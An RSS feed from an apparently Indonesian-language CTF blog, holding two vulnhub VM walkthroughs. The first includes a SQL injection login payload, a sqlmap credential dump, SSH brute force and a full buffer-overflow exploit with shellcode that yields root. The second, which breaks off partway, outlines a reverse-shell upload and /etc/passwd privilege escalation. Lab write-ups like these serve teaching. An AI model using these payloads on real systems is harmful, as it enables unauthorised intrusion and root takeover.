<?xml version="1.0" encoding="UTF-8" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
   
      <title>127.0.0.1:4000</title>
   
   <link>127.0.0.1:4000</link>
   <description>CTF, InfoSec, Banana And More..</description>
   <language>en-uk</language>
   <managingEditor> Aiden Pearce</managingEditor>
   <atom:link href="rss" rel="self" type="application/rss+xml" />
   
	<item>
	  <title>Lord Of The Root Write up</title>
	  <link>//lord-of-the-root-write-up</link>
	  <author>Aiden Pearce</author>
	  <pubDate>2017-05-03T00:00:00+08:00</pubDate>
	  <guid>//lord-of-the-root-write-up</guid>
	  <description><![CDATA[
	     <h1 id="description">Description</h1>

<p>Lord Of The Root adalah VM yang saya dapatkan dari situs vulnhub.com, yang dimana goal nya adalah dengan mendapatkan root access sehingga bisa membaca flag yang berada di <code>/root/Flag.txt</code></p>

<h1 id="proof-of-concept">Proof Of Concept</h1>

<h2 id="nmap-scanning">1. Nmap Scanning</h2>

<p>Saya hanya melakukan scanning port biasa menggunakan nmap agar mendapakat hasil dengan cepat dan setelah itu dapat dilakukan enumerasi <em>specific port</em>
<img src="/img/lordoftheroot/001.png" alt="web-content" class="img-responsive" /></p>

<p>Hanya terdapat port 22 (<em>SSH</em>) yang open, ketika SSH diakses terdapat banner “LOTR Knock Friend To Enter Easy as 1,2,3”
<img src="/img/lordoftheroot/002.png" alt="web-content" class="img-responsive" /></p>

<p>Saya menduga pesan dari “Knock Friend To Enter” merupakan hint untuk <em>Port Knocking</em> dan angka 1,2,3 adalah <em>Sequence Port</em> untuk membuka port yang dilindungi</p>

<h2 id="port-knocking">2. Port Knocking</h2>

<p>Untuk melakukan Port Knocking dapat menggunakan <code>knock - port-knock client</code></p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span></span> <span class="o">~</span> <span class="err">→</span> <span class="n">knock</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.101</span> <span class="mi">1</span> <span class="mi">2</span> <span class="mi">3</span> <span class="o">-</span><span class="n">v</span>                                             
<span class="n">hitting</span> <span class="n">tcp</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.101</span><span class="p">:</span><span class="mi">1</span>
<span class="n">hitting</span> <span class="n">tcp</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.101</span><span class="p">:</span><span class="mi">2</span>
<span class="n">hitting</span> <span class="n">tcp</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.101</span><span class="p">:</span><span class="mi">3</span></code></pre></figure>

<p>Setelah melakukan <em>Port Knocking</em> dan discan lagi menggunakan <code>nmap</code> terlihat bahwa ada port 1337 yang terbuka
<img src="/img/lordoftheroot/003.png" alt="web-content" class="img-responsive" /></p>

<p>Enumerasi lebih lanjut terhadap port 1337 ternyata port tersebut menjalankan service <code>Apache2</code> <em>Web Server</em>
<img src="/img/lordoftheroot/004.png" alt="web-content" class="img-responsive" /></p>

<h2 id="web-application-attack---sql-injection">3. Web Application Attack - Sql Injection</h2>

<p>Saat mengakses web hanya terdapat gambar trolling dan pada file <code>robots.txt</code> juga terdapat gambar, tapi saat di <em>Inspect Element</em> ada <em>Base64</em> encode string</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span></span><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;/images/hipster.jpg&quot;</span> <span class="na">align</span><span class="o">=</span><span class="s">&quot;middle&quot;</span><span class="p">&gt;</span>
<span class="c">&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;</span>
<span class="c">&lt;/html&gt;</span></code></pre></figure>

<p>Lakukan decode string base64 tersebut</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="nb">echo</span> <span class="s2">&quot;THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&quot;</span> <span class="p">|</span> base64 -d       
<span class="nv">Lzk3ODM0NTIxMC9pbmRleC5waHA</span><span class="o">=</span> Closer!
<span class="nb">echo</span> <span class="s2">&quot;Lzk3ODM0NTIxMC9pbmRleC5waHA=&quot;</span> <span class="p">|</span> base64 -d                           
/978345210/index.php</code></pre></figure>

<p>Path <code>/978345210/index.php</code> akan mengantarkan kita pada form login, login menggunakan payload <code>' or 1=1 limit 1 -- --+</code> berhasil dan menandakan form login tersebut <em>Vulnerable</em> terhadap serangan <em>Post Sql Injection</em></p>

<h4 id="sqlmap-in-action">[+] Sqlmap In Action</h4>

<p><code>sqlmap -u http://192.168.56.101:1337//978345210/index.php --data "username=admin&amp;password=passwd&amp;submit=Login" --level 5 --risk 3 --current-db</code></p>

<p>Inject menggunakan <code>sqlmap</code> didapatkan <code>webapp</code> adalah database yang digunakan oleh web
<img src="/img/lordoftheroot/005.png" alt="web-content" class="img-responsive" />
Dalam tabel <code>Users</code> didapatkan <code>Username dan password</code> dari berbagai account untuk login ke web
<img src="/img/lordoftheroot/009.png" alt="web-content" class="img-responsive" />
Tapi dalam web tersebut tidak ada yang menarik yang bisa dimanfaatkan untuk mendapatkan access ke <em>System</em>
<img src="/img/lordoftheroot/006.png" alt="web-content" class="img-responsive" /></p>

<h2 id="ssh-brute-force">4. SSH Brute Force</h2>

<p>Karena tidak ada service atau application lain selain SSH dan Web Server, saya memutuskan untuk melakukan <em>Brute Force</em> pada SSH menggunakan <em>Credential</em> yang didapatkan dari SQL Injection.
<img src="/img/lordoftheroot/010.png" alt="web-content" class="img-responsive" />
Hasil Brute Force didapatkan user <code>smeagol</code> dengan password <code>MyPreciousR00t</code> Success login.</p>

<h2 id="privilege-escalation">5. Privilege Escalation</h2>
<p>Menurut deskrisi dari <em>Author</em> Vm Lord Of The Root, terdapat 2 cara untuk melakukan privlege Escalation
Tapi sebenarnya ada 3 cara untuk mendapatkan access root pada VM ini, yaitu : Buffer overflow exploit, local exploit dan Mysql UDF</p>

<h3 id="buffer-overflow-exploit">Buffer Overflow Exploit</h3>

<p>Binary yang <em>Vulnerable</em> terhadap buffer overflow saya temukan dengan menggunakan command <code>find</code>
<img src="/img/lordoftheroot/007.png" alt="web-content" class="img-responsive" />
ASLR dalam system ini dalam keadaan ON.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>smeagol@LordOfTheRoot:~$ cat /proc/sys/kernel/randomize_va_space
<span class="m">2</span></code></pre></figure>

<p>Sehingga pembuatan exploitnya agak sulit,oleh karena itu kita dapat mem bruteforce dengan Stack Address yang valid dari hasil fuzzing menggunakan <code>gdb</code>. 
Saya tidak akan membahas detail masalah Buffer Overflow, tapi berikut adalah video bagaimana cara saya membuat payload untuk mengexploit.</p>
<iframe width="420" height="315" src="http://www.youtube.com/embed/SNduJAV3KAY" frameborder="0" allowfullscreen=""></iframe>
<p>Dalam percobaan menggunakan <code>gdb</code> <em>Stack Address</em> nya tidak berubah sehingga payloadnya berjalan dengan lancar.</p>

<p>Berikut hasil akhir exploit yang saya buat</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">struct</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
	<span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">getvuln_binary</span><span class="p">():</span>
        <span class="n">binary_path</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;/SECRET/door1/file&quot;</span><span class="p">,</span><span class="s2">&quot;/SECRET/door2/file&quot;</span><span class="p">,</span><span class="s2">&quot;/SECRET/door3/file&quot;</span><span class="p">]</span>
        <span class="n">vuln</span> <span class="o">=</span> <span class="p">[</span> <span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">binary_path</span> <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getsize</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">==</span> <span class="mi">5150</span><span class="p">]</span>
        <span class="k">return</span> <span class="n">vuln</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
	<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
		<span class="n">stack</span> <span class="o">=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xbffbecd0</span><span class="p">)</span>
		<span class="c1">#http://shell-storm.org/shellcode/files/shellcode-811.php</span>
		<span class="n">shellcode</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="s2">&quot;</span>
		<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">171</span> <span class="o">+</span> <span class="n">stack</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">20048</span> <span class="o">+</span> <span class="n">shellcode</span>
		<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">getvuln_binary</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&quot; &quot;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
	<span class="n">exploit</span><span class="p">()</span></code></pre></figure>

<p>Binary yang vulnerable buffer overflow akan berada acak dalam directory <code>/SECRET/door1</code> atau <code>/SECRET/door2</code> atau <code>/SECRET/door3</code>,
Sehingga fungsi <code>getvuln_binary</code> digunakan untuk mencari binary yang vulnerable buffer overflow dan ukuran binnary yang vulnerable adalah 5150 bytes.</p>

<h4 id="running-exploitpy">Running exploit.py</h4>
<p>Beberapa saat dijalankan didapatkan <em>Shell</em> dengan <code>euid=root</code>
<img src="/img/lordoftheroot/008.png" alt="web-content" class="img-responsive" /></p>

<h3 id="local-exploit">Local Exploit</h3>

<p>Locaroot untuk kernel 3.19.0-25-generic bisa didapatkan di <a href="https://www.exploit-db.com/exploits/39166/">Exploit-DB</a>
<img src="/img/lordoftheroot/011.png" alt="web-content" class="img-responsive" /></p>

<h2 id="final--get-the-flag">Final : Get The Flag</h2>

<p>Flag berada pada <code>/root/Flag.txt</code></p>

<blockquote>
<p>“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf</p>
</blockquote>

	  ]]></description>
	</item>

	<item>
	  <title>Hackday - Albania 2016 Write Up</title>
	  <link>//hackday-albania-2016-writeup</link>
	  <author>Aiden Pearce</author>
	  <pubDate>2017-03-25T00:00:00+08:00</pubDate>
	  <guid>//hackday-albania-2016-writeup</guid>
	  <description><![CDATA[
	     <h1 id="executive-summary">Executive Summary</h1>

<p>Hackday : Albania 2016 adalah VM yang saya dapatkan dari vulnhub.com, VM ini memiliki 2 service yang berjalan, SSH pada port <em>default</em> dan Web Server pada port 8008 serta terdapat web apps yang vulnerable terhadap serangan SQL Injection.</p>

<h2 id="quick-poc">Quick POC</h2>

<ol>
  <li>Scanning Live Host menggunakan <code>nmap</code></li>
  <li>Port 8080 adalah port yang digunakan untuk menjalankan webserver</li>
  <li>robots.txt untuk melihat directory dan akan mengarahkan ke web apps yang vulnerable terhdapat serangan SQl Injection</li>
  <li>Sql Injection terdapat pada parameter username di form login</li>
  <li>Inject menggunakan <code>sqlmap</code> dan didapatkan payload yang digunakan untuk login</li>
  <li>Upload file php reverse shell untuk mendapatkan akses ke server</li>
  <li>Dengan menggunakan command <code>find</code>, didapatkan file <code>/etc/passwd</code> dalam keadaan writeable untuk other</li>
  <li>Update password pada salah satu user ( yang memiliki akses tinggi, ex : sudoers) di <code>/etc/passwd</code></li>
  <li>Akses <code>/bin/bash</code> dengan menggunakan sudo command untuk mendapatkan root akses</li>
  <li>Get the flag :p</li>
</ol>

<h1 id="proof-of-concept">Proof Of Concept</h1>

<h3 id="live-host-scanning-using-nmap">1. Live Host Scanning Using Nmap</h3>
<p>Saya melukan live host scanning untuk mengetahui ip dari system hackday sehingga dapat mempersempit scanning service enumeration , dan didapatkan ip <code>192.168.10.101</code> yang digunakan oleh system hackday</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql"><span></span><span class="err">➜</span>  <span class="n">hackday</span> <span class="p">:</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sn</span> <span class="o">-</span><span class="n">T4</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">1</span><span class="o">/</span><span class="mi">24</span>

<span class="k">Starting</span> <span class="n">Nmap</span> <span class="mi">7</span><span class="p">.</span><span class="mi">01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2017</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">23</span> <span class="mi">08</span><span class="p">:</span><span class="mi">31</span> <span class="n">WIB</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">1</span>
<span class="n">Host</span> <span class="k">is</span> <span class="nf">up</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00073</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span>
<span class="n">Host</span> <span class="k">is</span> <span class="nf">up</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00096</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">256</span> <span class="n">IP</span> <span class="nf">addresses</span> <span class="p">(</span><span class="mi">2</span> <span class="n">hosts</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="k">in</span> <span class="mi">15</span><span class="p">.</span><span class="mi">36</span> <span class="n">seconds</span></code></pre></figure>

<p>1.png</p>

<h3 id="service-enumeration-using-nmap">2. Service Enumeration Using Nmap</h3>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql"><span></span><span class="err">➜</span>  <span class="n">hackday</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">A</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="n">T4</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span> 

<span class="k">Starting</span> <span class="n">Nmap</span> <span class="mi">7</span><span class="p">.</span><span class="mi">01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2017</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">23</span> <span class="mi">08</span><span class="p">:</span><span class="mi">41</span> <span class="n">WIB</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span>
<span class="n">Host</span> <span class="k">is</span> <span class="nf">up</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">0013</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
<span class="k">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">998</span> <span class="n">closed</span> <span class="n">ports</span>
<span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="n">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mi">7</span><span class="p">.</span><span class="mi">2</span><span class="n">p2</span> <span class="n">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu2</span><span class="p">.</span><span class="mi">1</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
<span class="o">|</span>   <span class="mi">2048</span> <span class="mi">39</span><span class="p">:</span><span class="mi">76</span><span class="p">:</span><span class="n">a2</span><span class="p">:</span><span class="n">f0</span><span class="p">:</span><span class="mi">82</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span><span class="p">:</span><span class="mi">1</span><span class="n">f</span><span class="p">:</span><span class="mi">75</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="n">e4</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="n">c5</span><span class="p">:</span><span class="n">a7</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="n">b1</span><span class="p">:</span><span class="mi">58</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mi">21</span><span class="p">:</span><span class="n">fe</span><span class="p">:</span><span class="mi">63</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">2</span><span class="n">c</span><span class="p">:</span><span class="n">cb</span><span class="p">:</span><span class="n">a1</span><span class="p">:</span><span class="n">f1</span><span class="p">:</span><span class="n">b6</span><span class="p">:</span><span class="n">ba</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="n">dd</span><span class="p">:</span><span class="n">ed</span><span class="p">:</span><span class="n">d3</span><span class="p">:</span><span class="n">d9</span><span class="p">:</span><span class="mi">48</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
<span class="mi">8008</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">http</span>    <span class="n">Apache</span> <span class="n">httpd</span> <span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">18</span> <span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">robots</span><span class="p">.</span><span class="n">txt</span><span class="p">:</span> <span class="mi">26</span> <span class="n">disallowed</span> <span class="nf">entries</span> <span class="p">(</span><span class="mi">15</span> <span class="n">shown</span><span class="p">)</span>
<span class="o">|</span> <span class="o">/</span><span class="n">rkfpuzrahngvat</span><span class="o">/</span> <span class="o">/</span><span class="n">slgqvasbiohwbu</span><span class="o">/</span> <span class="o">/</span><span class="n">tmhrwbtcjpixcv</span><span class="o">/</span> 
<span class="o">|</span> <span class="o">/</span><span class="n">vojtydvelrkzex</span><span class="o">/</span> <span class="o">/</span><span class="n">wpkuzewfmslafy</span><span class="o">/</span> <span class="o">/</span><span class="n">xqlvafxgntmbgz</span><span class="o">/</span> <span class="o">/</span><span class="n">yrmwbgyhouncha</span><span class="o">/</span> 
<span class="o">|</span> <span class="o">/</span><span class="n">zsnxchzipvodib</span><span class="o">/</span> <span class="o">/</span><span class="n">atoydiajqwpejc</span><span class="o">/</span> <span class="o">/</span><span class="n">bupzejbkrxqfkd</span><span class="o">/</span> <span class="o">/</span><span class="n">cvqafkclsyrgle</span><span class="o">/</span> 
<span class="o">|</span><span class="n">_</span><span class="o">/</span><span class="n">unisxcudkqjydw</span><span class="o">/</span> <span class="o">/</span><span class="n">dwrbgldmtzshmf</span><span class="o">/</span> <span class="o">/</span><span class="n">exschmenuating</span><span class="o">/</span> <span class="o">/</span><span class="n">fytdinfovbujoh</span><span class="o">/</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">18</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">HackDay</span> <span class="n">Albania</span> <span class="mi">2016</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>

<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="p">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="p">.</span>
<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="nf">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="k">in</span> <span class="mi">20</span><span class="p">.</span><span class="mi">16</span> <span class="n">seconds</span></code></pre></figure>

<p>Dari hasil scanning <code>Nmap</code> terdapat 2 open port yaitu port 22 port default untuk SSH dan port 8008 port untuk Web Server.</p>

<h2 id="robotstxt-parser-and-directory-scanner">3. robots.txt Parser And Directory Scanner</h2>

<p>Dari hasil scanning menggunakan <code>nmap</code>, terdapat robots.txt yang berisi banyak directory yang <em>disallow</em> yang dapat kita jadikan wordlist untuk mencari directory yang mungkin terdapat <em>Vulnerable Web Apps</em> didalam nya sehingga dapat membawa kita mendapatkan akses ke system hackday. 
Saat mencoba mengakses directory yang berada di robots.txt halaman tersebut memiliki content yang sama.</p>

<p><img src="/img/hackday/gambar_sama.png" alt="web-content" class="img-responsive" /></p>

<p>Saya membuat script python untuk menghitung <em>Content-Lenght</em> dari list directory sehingga bisa membandingkan Content atau isi dari directory tersebut tanpa perlu menklik satu per satu.</p>

<p>Gunakan <code>curl</code> untuk mendapatkan list directory di robots.txt</p>

<p><code>curl http://192.168.10.101:8008/robots.txt | cut -d "/" -f2 &gt; webdir.txt</code></p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="c1">#Content-Length Identifier</span>
<span class="c1">#cl-identifier.py</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;webdir.txt&quot;</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">words</span><span class="p">:</span>
  <span class="n">words</span> <span class="o">=</span> <span class="n">words</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
<span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">words</span><span class="p">:</span>
  <span class="n">URL</span> <span class="o">=</span> <span class="s2">&quot;http://192.168.10.101:8008/</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">word</span><span class="p">)</span>
  <span class="c1">#print URL</span>
  <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span>
  <span class="k">print</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2"> : </span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">URL</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">))</span>                               </code></pre></figure>

<p>Setelah menjalankan script <code>cl-identifier.py</code> didapatkan directory <em>unisxcudkqjydw</em> memiliki panjang content yang berbeda, sehingga dapat saya simpulkan content tersebut bukankan content yang sama seperti sebelumnya.</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql"><span></span><span class="err">➜</span>  <span class="n">hackday</span> <span class="n">python</span> <span class="n">cl</span><span class="o">-</span><span class="n">identifier</span><span class="p">.</span><span class="n">py</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">rkfpuzrahngvat</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">slgqvasbiohwbu</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">tmhrwbtcjpixcv</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">vojtydvelrkzex</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">wpkuzewfmslafy</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">xqlvafxgntmbgz</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">yrmwbgyhouncha</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">zsnxchzipvodib</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">atoydiajqwpejc</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">bupzejbkrxqfkd</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">cvqafkclsyrgle</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">unisxcudkqjydw</span> <span class="p">:</span> <span class="mi">37</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">dwrbgldmtzshmf</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">exschmenuating</span> <span class="p">:</span> <span class="mi">165</span>
